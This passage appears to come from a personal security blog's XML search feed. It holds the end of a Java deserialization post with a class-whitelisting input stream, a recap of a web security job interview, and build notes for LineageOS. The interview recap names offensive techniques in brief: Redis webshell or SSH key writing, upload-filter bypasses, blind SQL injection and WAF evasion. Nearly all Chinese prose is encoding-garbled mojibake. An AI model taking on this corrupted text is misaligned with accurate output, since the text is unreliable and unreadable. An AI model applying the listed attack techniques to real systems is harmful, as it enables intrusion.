class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åªå…è®¸ååºåˆ—åŒ–VulnSerializeç±»</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(VulnSerialize<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨AntObjectInputStreamååºåˆ—åŒ–åˆ™ä¸ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œå› ä¸ºæˆ‘ä»¬åªå…è®¸ååºåˆ—åŒ–VulnSerializeç±»ï¼š</p><p><img src="/ååºåˆ—åŒ–-Javaååºåˆ—åŒ–åŸºæœ¬åŸç†/1546054466567.png" alt="1546054466567"></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å±±çŸ³ç½‘ç§‘webå®‰å…¨å·¥ç¨‹å¸ˆé¢è¯•å¤ç›˜</title>
      <link href="/%E9%9D%A2%E8%AF%95-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"/>
      <url>/%E9%9D%A2%E8%AF%95-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šå‘¨æ— æ„åœ¨BOSSç›´è˜ä¸Šå‘äº†ç®€å†ï¼Œç»“æœå±±çŸ³ç½‘ç§‘æ¥ç”µè¯é¢è¯•ã€‚å½“æ—¶æ™šä¸Šå…«ç‚¹ï¼Œæˆ‘æ­£åœ¨å›å®¶çš„åœ°é“ä¸Šï¼Œå¾ˆå†·ï¼Œåˆå› ä¸ºç¬¬ä¸€æ¬¡é¢è¯•æœ‰ç‚¹ç´§å¼ ï¼Œè‡ªå·±æ„Ÿè§‰å¾ˆå¤šé—®é¢˜ç­”å¾—ä¸å¥½ï¼Œè¿™é‡Œå°½é‡å›å¿†é¢è¯•å†…å®¹ï¼Œå¸Œæœ›ä¸‹æ¬¡èƒ½å¤Ÿåšå¥½å‡†å¤‡ã€‚</p><h2 id="Q1ï¼šè¯´ä¸€ä¸‹æ¸—é€ä¸€ä¸ªç½‘ç«™çš„å…·ä½“æµç¨‹"><a href="#Q1ï¼šè¯´ä¸€ä¸‹æ¸—é€ä¸€ä¸ªç½‘ç«™çš„å…·ä½“æµç¨‹" class="headerlink" title="Q1ï¼šè¯´ä¸€ä¸‹æ¸—é€ä¸€ä¸ªç½‘ç«™çš„å…·ä½“æµç¨‹"></a>Q1ï¼šè¯´ä¸€ä¸‹æ¸—é€ä¸€ä¸ªç½‘ç«™çš„å…·ä½“æµç¨‹</h2><p>é¦–å…ˆä¿¡æ¯æ”¶é›†ï¼Œåˆ¤æ–­ç½‘ç«™æ˜¯å¦æœ‰CDNï¼Œæ¥ç€äº†è§£æ•´ä¸ªç½‘ç«™çš„å·¥ä½œæµç¨‹ï¼Œæ¥ç€æ‰«æç«¯å£ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆå¼±æœåŠ¡ï¼Œæ¯”å¦‚Rediså¼±å£ä»¤ï¼Œæ¥ç€æˆ‘ä¼šæ‰¾é€»è¾‘æ¼æ´ï¼Œæ¯”å¦‚è¯´å¯†ç é‡ç½®ã€‚ï¼ˆæœ€é‡è¦çš„OWASP TOP 10å±…ç„¶å¿˜äº†è®²ï¼‰</p><a id="more"></a><h2 id="Q2ï¼šè¯´ä¸€ä¸‹å¦‚ä½•ç»•è¿‡CDN"><a href="#Q2ï¼šè¯´ä¸€ä¸‹å¦‚ä½•ç»•è¿‡CDN" class="headerlink" title="Q2ï¼šè¯´ä¸€ä¸‹å¦‚ä½•ç»•è¿‡CDN"></a>Q2ï¼šè¯´ä¸€ä¸‹å¦‚ä½•ç»•è¿‡CDN</h2><p>å¯ä»¥æš´åŠ›æ‰«æå…¨ç½‘ï¼›å¯»æ‰¾ä¸Šä¼ æœåŠ¡ï¼ŒæŠ“åŒ…ï¼›å¯»æ‰¾é‚®ä»¶æœåŠ¡ï¼Œçœ‹IPã€‚ï¼ˆåº”è¯¥è¿˜æœ‰å¾ˆå¤šçš„ï¼Œæ¯”å¦‚è¯´çœ‹DNSå†å²è§£æè®°å½•ï¼‰</p><h2 id="Q3ï¼šè¯´ä¸€ä¸‹Redisæ¼æ´å¦‚ä½•åˆ©ç”¨"><a href="#Q3ï¼šè¯´ä¸€ä¸‹Redisæ¼æ´å¦‚ä½•åˆ©ç”¨" class="headerlink" title="Q3ï¼šè¯´ä¸€ä¸‹Redisæ¼æ´å¦‚ä½•åˆ©ç”¨"></a>Q3ï¼šè¯´ä¸€ä¸‹Redisæ¼æ´å¦‚ä½•åˆ©ç”¨</h2><p>å½“æ—¶æˆ‘åªè¯´äº†ä¸€ä¸ªå†™webshellçš„ï¼Œä½†æ˜¯å¦‚æœredisæƒé™å¤Ÿå¤§çš„è¯è¿˜å¯ä»¥å†™contrabæˆ–æ˜¯sshkeyã€‚</p><h2 id="Q4ï¼šè¯´ä¸€ä¸‹å¯¹äºä¸åŒwebå®¹å™¨ï¼Œå¦‚ä½•åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#Q4ï¼šè¯´ä¸€ä¸‹å¯¹äºä¸åŒwebå®¹å™¨ï¼Œå¦‚ä½•åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="Q4ï¼šè¯´ä¸€ä¸‹å¯¹äºä¸åŒwebå®¹å™¨ï¼Œå¦‚ä½•åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>Q4ï¼šè¯´ä¸€ä¸‹å¯¹äºä¸åŒwebå®¹å™¨ï¼Œå¦‚ä½•åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><p>nginxç”¨00æˆ–æ¢è¡Œæˆªæ–­ï¼ŒIISç”¨<code>;</code>éš”å¼€ï¼ˆå¿˜è®°è®²apacheç”¨å¤šé‡æ–‡ä»¶åç»•è¿‡ï¼‰</p><h2 id="Q5ï¼šç®€è¦ä»‹ç»ä¸€ä¸‹ç›²æ³¨"><a href="#Q5ï¼šç®€è¦ä»‹ç»ä¸€ä¸‹ç›²æ³¨" class="headerlink" title="Q5ï¼šç®€è¦ä»‹ç»ä¸€ä¸‹ç›²æ³¨"></a>Q5ï¼šç®€è¦ä»‹ç»ä¸€ä¸‹ç›²æ³¨</h2><p>ç›²æ³¨åˆ†ä¸ºåŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒåŸºäºboolçš„ç›²æ³¨ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡ç­‰å¾…æ—¶é—´åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦çš„asciiç ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡è¿”å›ç°è±¡åˆ¤æ–­å­—ç¬¦çš„asciiç ã€‚</p><h2 id="Q6ï¼šä½ åœ¨SQLæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°å“ªäº›å‡½æ•°ï¼Ÿ"><a href="#Q6ï¼šä½ åœ¨SQLæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°å“ªäº›å‡½æ•°ï¼Ÿ" class="headerlink" title="Q6ï¼šä½ åœ¨SQLæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°å“ªäº›å‡½æ•°ï¼Ÿ"></a>Q6ï¼šä½ åœ¨SQLæ³¨å…¥æ—¶ç»å¸¸ç”¨åˆ°å“ªäº›å‡½æ•°ï¼Ÿ</h2><p>è¿™é¢˜ç›®æå¾—æˆ‘çœ¼å‰ä¸€é»‘ï¼Œæˆ‘ç»å¸¸ç”¨çš„éš¾é“ä¸æ˜¯UNION SELECTè¿™ç§æ“ä½œç¬¦ä¹ˆOrzï¼Œç„¶åæˆ‘å°±è®²äº†lengthï¼Œifï¼Œsubstringï¼Œasciiï¼Œå…¶ä»–çš„ä¸€æ—¶åŠä¼šå®åœ¨æƒ³ä¸èµ·æ¥ã€‚ç°åœ¨æƒ³æƒ³å…¶å®è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚æŠ¥é”™çš„å‡½æ•°EXTRACTVALUEã€è¿æ¥å‡½æ•°concatç­‰ã€‚</p><h2 id="Q7ï¼šåœ¨æ³¨å…¥æ—¶é‡åˆ°WAFæ€ä¹ˆåŠï¼Ÿ"><a href="#Q7ï¼šåœ¨æ³¨å…¥æ—¶é‡åˆ°WAFæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="Q7ï¼šåœ¨æ³¨å…¥æ—¶é‡åˆ°WAFæ€ä¹ˆåŠï¼Ÿ"></a>Q7ï¼šåœ¨æ³¨å…¥æ—¶é‡åˆ°WAFæ€ä¹ˆåŠï¼Ÿ</h2><p>è®²äº†ä¸€ç§åˆ©ç”¨fuzzç»•è¿‡å®‰å…¨ç‹—çš„æ€è·¯ï¼Œä¸çŸ¥é“è€ƒå®˜å¬æ‡‚æ²¡æœ‰T_T</p><h2 id="Q8ï¼šäº†è§£PHPçš„æ–‡ä»¶åŒ…å«å—ï¼Ÿ"><a href="#Q8ï¼šäº†è§£PHPçš„æ–‡ä»¶åŒ…å«å—ï¼Ÿ" class="headerlink" title="Q8ï¼šäº†è§£PHPçš„æ–‡ä»¶åŒ…å«å—ï¼Ÿ"></a>Q8ï¼šäº†è§£PHPçš„æ–‡ä»¶åŒ…å«å—ï¼Ÿ</h2><p>ä¸äº†è§£ã€‚</p><h2 id="Q9ï¼šäº†è§£ååºåˆ—åŒ–å—ï¼Ÿ"><a href="#Q9ï¼šäº†è§£ååºåˆ—åŒ–å—ï¼Ÿ" class="headerlink" title="Q9ï¼šäº†è§£ååºåˆ—åŒ–å—ï¼Ÿ"></a>Q9ï¼šäº†è§£ååºåˆ—åŒ–å—ï¼Ÿ</h2><p>ä¸äº†è§£ã€‚ï¼ˆååºåˆ—åŒ–çœŸå¾—å¥½å¥½çœ‹çœ‹ï¼Œä¸ä»…è€ƒå®˜é—®å¾—å¤šï¼Œå„ç§è¯­è¨€å¥½åƒéƒ½æœ‰ç€ç±»é—®é¢˜ï¼‰</p><h2 id="Q10ï¼šè¯´ä¸€ä¸‹ä½ å°è±¡æœ€æ·±çš„æ¸—é€ç»å†"><a href="#Q10ï¼šè¯´ä¸€ä¸‹ä½ å°è±¡æœ€æ·±çš„æ¸—é€ç»å†" class="headerlink" title="Q10ï¼šè¯´ä¸€ä¸‹ä½ å°è±¡æœ€æ·±çš„æ¸—é€ç»å†"></a>Q10ï¼šè¯´ä¸€ä¸‹ä½ å°è±¡æœ€æ·±çš„æ¸—é€ç»å†</h2><p>è¿™é‡Œæˆ‘æ„Ÿè§‰ç­”å¾—è¿˜å¯ä»¥ï¼Œè®²äº†ä¸€ä¸ªé€šè¿‡Docker Remote API getshellçš„ç»å†ã€‚</p><h2 id="Q11ï¼šæ—¢ç„¶ä½ è°ˆåˆ°äº†Dockerï¼Œé‚£ä¹ˆDocker-fileçš„RUNï¼ŒENTRYPOINTå’ŒCMDæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#Q11ï¼šæ—¢ç„¶ä½ è°ˆåˆ°äº†Dockerï¼Œé‚£ä¹ˆDocker-fileçš„RUNï¼ŒENTRYPOINTå’ŒCMDæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="Q11ï¼šæ—¢ç„¶ä½ è°ˆåˆ°äº†Dockerï¼Œé‚£ä¹ˆDocker fileçš„RUNï¼ŒENTRYPOINTå’ŒCMDæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>Q11ï¼šæ—¢ç„¶ä½ è°ˆåˆ°äº†Dockerï¼Œé‚£ä¹ˆDocker fileçš„RUNï¼ŒENTRYPOINTå’ŒCMDæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>docker fileçš„RUNå‘½ä»¤åªåœ¨æ„å»ºé•œåƒæ—¶è¿è¡Œï¼ŒENTRYPOINTå’ŒCMDå‘½ä»¤å‡åœ¨åˆ©ç”¨é•œåƒå®ä¾‹åŒ–å®¹å™¨æ—¶è¿è¡Œï¼Œåœ¨å®ä¾‹åŒ–æ—¶è¾“å…¥æ–°å‘½ä»¤ä¼šè¦†ç›–æ‰CMDå‘½ä»¤ï¼Œè€Œè‹¥ä½¿ç”¨ENTRYPOINTå‘½ä»¤æ—¶ï¼Œæ–°çš„å‘½ä»¤ä¼šä½œä¸ºå‚æ•°æ¥åœ¨ENTRYPOINTå‘½ä»¤åé¢ã€‚</p><h2 id="Q12ï¼šæ“…é•¿ä»€ä¹ˆè¯­è¨€"><a href="#Q12ï¼šæ“…é•¿ä»€ä¹ˆè¯­è¨€" class="headerlink" title="Q12ï¼šæ“…é•¿ä»€ä¹ˆè¯­è¨€"></a>Q12ï¼šæ“…é•¿ä»€ä¹ˆè¯­è¨€</h2><p>æ“…é•¿Pythonï¼ŒJavaå’ŒPHPèƒ½çœ‹å¾—æ‡‚ã€‚</p><h2 id="Q13ï¼šç”¨Pythonå†™è¿‡ä»€ä¹ˆé¡¹ç›®å—"><a href="#Q13ï¼šç”¨Pythonå†™è¿‡ä»€ä¹ˆé¡¹ç›®å—" class="headerlink" title="Q13ï¼šç”¨Pythonå†™è¿‡ä»€ä¹ˆé¡¹ç›®å—"></a>Q13ï¼šç”¨Pythonå†™è¿‡ä»€ä¹ˆé¡¹ç›®å—</h2><p>ç”¨Pythonå†™è¿‡ä¸€ä¸ªAPKå®‰å…¨æ‰«ææ¡†æ¶ï¼Œblablablaâ€¦</p><h2 id="Q14ï¼šæ‰“è¿‡CTFå—ï¼Ÿè¯´ä¸€è¯´æ¯”èµ›ç»éªŒï¼Ÿ"><a href="#Q14ï¼šæ‰“è¿‡CTFå—ï¼Ÿè¯´ä¸€è¯´æ¯”èµ›ç»éªŒï¼Ÿ" class="headerlink" title="Q14ï¼šæ‰“è¿‡CTFå—ï¼Ÿè¯´ä¸€è¯´æ¯”èµ›ç»éªŒï¼Ÿ"></a>Q14ï¼šæ‰“è¿‡CTFå—ï¼Ÿè¯´ä¸€è¯´æ¯”èµ›ç»éªŒï¼Ÿ</h2><p>ä¹Ÿå°±éšä¾¿è¯´è¯´äº†ã€‚</p><h2 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h2><p>åŒ…æ‹¬ä»€ä¹ˆæ—¶å€™å¯ä»¥å®ä¹ ï¼Ÿä»¥åæƒ³åšå“ªä¸€å—ï¼Œweb or binï¼Ÿï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æ—¢ç„¶å‡‰äº†ä¸ºå•¥è¦é—®è¿™ç§é—®é¢˜Orzï¼‰ï¼Ÿæœ‰ä»€ä¹ˆæƒ³è¦é—®é¢è¯•å®˜çš„ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> é¢ç» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> é¢ç» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LineageOSæºä»£ç ç¼–è¯‘ç¬”è®°</title>
      <link href="/android-LineageOS%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91%E7%AC%94%E8%AE%B0/"/>
      <url>/android-LineageOS%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ç ”ç©¶å®‰å“å®‰å…¨æ—¶ï¼Œå¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦ä¿®æ”¹å®‰å“æºä»£ç ï¼ˆå¦‚åŠ¨æ€è°ƒè¯•æ—¶è¿‡æ‰åè°ƒè¯•æœºåˆ¶ï¼‰ã€‚LineageOSæ˜¯æ ¹æ®Androidå®˜æ–¹æºç ä¿®æ”¹åçš„ç‰ˆæœ¬ï¼Œå¯¹å¾ˆå¤šæ‰‹æœºéƒ½é€‚é…ï¼Œå› æ­¤ç¼–è¯‘è¯¥ç‰ˆæœ¬çš„æºç æ¯”ç›´æ¥ç¼–è¯‘AOSPçš„æ›´åŠ æœ‰æ„ä¹‰ã€‚æœ¬æ–‡ç®€è¦è¯´æ˜ä¸€ä¸‹ç¼–è¯‘LineageOSçš„æ­¥éª¤ã€‚æ›´è¯¦ç»†çš„æ­¥éª¤è¯´æ˜è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£: <a href="https://wiki.lineageos.org/build_guides.html" target="_blank" rel="noopener">https://wiki.lineageos.org/build_guides.html</a></p><a id="more"></a><p>é¦–å…ˆè¯´æ˜ä¸€ä¸‹æˆ‘è¿™çš„æ“ä½œç³»ç»Ÿå’Œéœ€è¦ç¼–è¯‘çš„LineageOSç‰ˆæœ¬<br>æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux anemone-VirtualBox 4.13.0-26-generic <span class="comment">#29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure></p><p>ç¼–è¯‘çš„LineageOSç‰ˆæœ¬<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=7.1.2</span><br><span class="line">LINEAGE_VERSION=14.1-20180325-UNOFFICIAL-mako</span><br><span class="line">TARGET_PRODUCT=lineage_mako</span><br><span class="line">TARGET_BUILD_VARIANT=userdebug</span><br><span class="line">TARGET_BUILD_TYPE=release</span><br><span class="line">TARGET_BUILD_APPS=</span><br><span class="line">TARGET_ARCH=arm</span><br><span class="line">TARGET_ARCH_VARIANT=armv7<span class="_">-a</span>-neon</span><br><span class="line">TARGET_CPU_VARIANT=krait</span><br><span class="line">TARGET_2ND_ARCH=</span><br><span class="line">TARGET_2ND_ARCH_VARIANT=</span><br><span class="line">TARGET_2ND_CPU_VARIANT=</span><br><span class="line">HOST_ARCH=x86_64</span><br><span class="line">HOST_2ND_ARCH=x86</span><br><span class="line">HOST_OS=linux</span><br><span class="line">HOST_OS_EXTRA=Linux-4.13.0-26-generic-x86_64-with-Ubuntu-16.04-xenial</span><br><span class="line">HOST_CROSS_OS=windows</span><br><span class="line">HOST_CROSS_ARCH=x86</span><br><span class="line">HOST_CROSS_2ND_ARCH=x86_64</span><br><span class="line">HOST_BUILD_TYPE=release</span><br><span class="line">BUILD_ID=NJH47F</span><br><span class="line">OUT_DIR=/media/anemone/lineage/lineageOS/out</span><br><span class="line">WITH_SU=<span class="literal">true</span></span><br><span class="line">============================================</span><br></pre></td></tr></table></figure></p><p>é¡ºå¸¦å¯ä»¥çœ‹åˆ°æˆ‘è¿™é‡Œéœ€è¦ç¼–è¯‘çš„Androidç‰ˆæœ¬æ˜¯7.1.1, ç›®æ ‡è®¾å¤‡æ˜¯Nexus4æ‰‹æœºã€‚</p><h1 id="æ­å»ºç¼–è¯‘ç¯å¢ƒ"><a href="#æ­å»ºç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="æ­å»ºç¼–è¯‘ç¯å¢ƒ"></a>æ­å»ºç¼–è¯‘ç¯å¢ƒ</h1><p>å®‰è£…jdk<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure></p><p>å®‰è£…ç¼–è¯‘æ—¶éœ€è¦ä¾èµ–çš„åº“<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bc bison build-essential curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick lib32ncurses5-dev lib32z1-dev libesd0-dev liblz4-tool libncurses5-dev libsdl1.2-dev libwxgtk3.0-dev libxml2 libxml2-utils lzop pngcrush schedtool squashfs-tools xsltproc zip zlib1g-dev openjdk-8-jdk lib32readline6-dev</span><br></pre></td></tr></table></figure></p><h1 id="ä¸‹è½½æºä»£ç "><a href="#ä¸‹è½½æºä»£ç " class="headerlink" title="ä¸‹è½½æºä»£ç "></a>ä¸‹è½½æºä»£ç </h1><p>å®‰è£…repoå·¥å…·<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repo</span><br><span class="line">chmod +x repo</span><br></pre></td></tr></table></figure></p><p>ä¸ºäº†æ–¹ä¾¿å¯ä»¥å°†å…¶æ‹·è´åˆ°ä½ çš„PATHé‡Œã€‚</p><p>ä½¿ç”¨repoå‘½ä»¤ä¸‹è½½æºä»£ç ï¼ˆå¯èƒ½æ¶‰åŠåˆ°ç§‘å­¦ä¸Šç½‘ï¼‰<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo init -u git://github.com/LineageOS/android.git -b cm-14.1</span><br><span class="line">repo sync -f --force-sync --no-clone-bundle</span><br></pre></td></tr></table></figure></p><h1 id="æå–è®¾å¤‡æ–‡ä»¶"><a href="#æå–è®¾å¤‡æ–‡ä»¶" class="headerlink" title="æå–è®¾å¤‡æ–‡ä»¶"></a>æå–è®¾å¤‡æ–‡ä»¶</h1><p>è™½ç„¶Androidæ˜¯å¼€æºçš„ï¼Œä½†æ˜¯æœ‰äº›è®¾å¤‡çš„æ–‡ä»¶ä¸æ˜¯é€šç”¨çš„ï¼ˆå¦‚ä¸å¼€æºçš„é©±åŠ¨æ–‡ä»¶ï¼‰ï¼Œæœ‰2ç§æ–¹æ³•æå–ï¼š1ï¼Œä»åˆ·å¥½ç›¸åŒç‰ˆæœ¬çš„LineageOSè®¾å¤‡ä¸­è·å–ï¼Œ2ï¼Œä»å·²ç»ç¼–è¯‘å¥½çš„LineageOSå¡åˆ·åŒ…ä¸­è·å–ã€‚è¿™é‡Œä»‹ç»ç¬¬äºŒç§ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»ä¸‹å¥½çš„å¡åˆ·åŒ…ä¸º<code>path/to/lineage-xxx.zip</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/android/system_dump/</span><br><span class="line"><span class="built_in">cd</span> ~/android/system_dump/</span><br><span class="line">unzip path/to/lineage-*.zip system.transfer.list system.new.dat</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/xpirt/sdat2img</span><br><span class="line">python sdat2img/sdat2img.py system.transfer.list system.new.dat system.img</span><br><span class="line">mkdir system/</span><br><span class="line">sudo mount system.img system/</span><br><span class="line">./extract-files.sh ~/android/system_dump/</span><br></pre></td></tr></table></figure><p>å°†system_dumpæ–‡ä»¶ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°<code>~/android/lineage/vendor/lge</code>æ–‡ä»¶å¤¹ä¸‹ã€‚</p><h1 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h1><p>å‡†å¤‡å·¥ä½œåšå®Œåå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ç¼–è¯‘å•¦~~ï¼Œä¸è¿‡åœ¨ç”±äºAndroidå·¥ç¨‹å·¨å¤§ï¼Œè¯·ç¡®ä¿ç¼–è¯‘çš„æœºå™¨æ‹¥æœ‰ä¸ä½äº10Gçš„å†…å­˜(äº²æµ‹è™šæ‹Ÿæœºå†…å­˜8Gï¼Œswap 8Gå¯ä»¥ç¼–è¯‘)ï¼Œä¸€ä¸ªé€Ÿåº¦è¶³å¤Ÿå¿«çš„ç¡¬ç›˜ï¼ˆå†æ¥ä¸€ä¸ªå›ºæ€å½“ç¼“å†²å°±æ›´å¥½å•¦ï¼‰ï¼Œå½“ç„¶è¿˜æœ‰ä¸€ä¸ªå¥½çš„CPUï¼ˆæˆ‘è¿™ç”¨çš„æ˜¯i7-4700HQ, åº”è¯¥ç®—æ¯”è¾ƒå·®çš„ç¼–è¯‘ç¯å¢ƒäº†ï¼Œæ•´ä¸ªç¼–è¯‘è¿‡ç¨‹éœ€è¦3ä¸ªå°æ—¶ï¼‰ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">. build/envsetup.sh</span><br><span class="line"><span class="built_in">export</span> WITH_SU=<span class="literal">true</span>    <span class="comment">#è‡ªå¸¦root</span></span><br><span class="line"><span class="built_in">export</span> JACK_SERVER_VM_ARGUMENTS=<span class="string">"-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx10G"</span>    <span class="comment">#è®¾ç½®ç¼–è¯‘å†…å­˜</span></span><br><span class="line">breakfast lineage_mako-userdebug <span class="comment">#é€‰æ‹©è®¾å¤‡å†…æ ¸</span></span><br><span class="line"><span class="built_in">export</span> USE_CCACHE=1 <span class="comment">#ä½¿ç”¨ç¼“å­˜</span></span><br><span class="line"><span class="built_in">export</span> CCACHE_DIR=/media/anemone/anemone_ssk/ccache <span class="comment">#ç¼“å­˜åœ°å€</span></span><br><span class="line">./prebuilts/misc/linux-x86/ccache/ccache  -M 100G    <span class="comment">#ä½¿ç”¨100Gä½œä¸ºç¼“å­˜ç©ºé—´</span></span><br><span class="line">brunch lineage_mako-userdebug</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gethæ­å»ºå…¬æœ‰èŠ‚ç‚¹orç§æœ‰é“¾èŠ‚ç‚¹</title>
      <link href="/%E5%8C%BA%E5%9D%97%E9%93%BE-Geth%E6%90%AD%E5%BB%BA%E5%85%AC%E6%9C%89%E8%8A%82%E7%82%B9or%E7%A7%81%E6%9C%89%E9%93%BE/"/>
      <url>/%E5%8C%BA%E5%9D%97%E9%93%BE-Geth%E6%90%AD%E5%BB%BA%E5%85%AC%E6%9C%89%E8%8A%82%E7%82%B9or%E7%A7%81%E6%9C%89%E9%93%BE/</url>
      
